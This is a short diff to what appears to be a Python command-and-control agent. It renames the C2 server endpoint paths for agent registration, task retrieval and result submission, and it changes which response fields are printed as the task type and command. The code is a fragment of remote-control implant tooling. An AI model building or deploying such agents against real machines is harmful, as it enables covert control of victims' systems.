@@ -11,9 +11,9 @@ import time
 ### configs ###
 
 c2_url = "http://127.0.0.1:5000"
-register_uri = "/register_agent"
-get_task_uri = "/get_task"
-send_results_uri = "/task_results"
+register_uri = "/agent/register"
+get_task_uri = "/agent/send_task"
+send_results_uri = "/agent/get_results"
 
 ### configs end ###
 
@@ -73,8 +73,8 @@ def get_task():
         resp = r.json()
         if resp["status"] == "ok":
             print("[+] Got task from C2 server")
-            print("[+] Task type:", resp["task"])
-            print("[+] Command:", resp["commands"])
+            print("[+] Task type:", resp["command_type"])
+            print("[+] Command:", resp["cmd"])
 
 
         else:
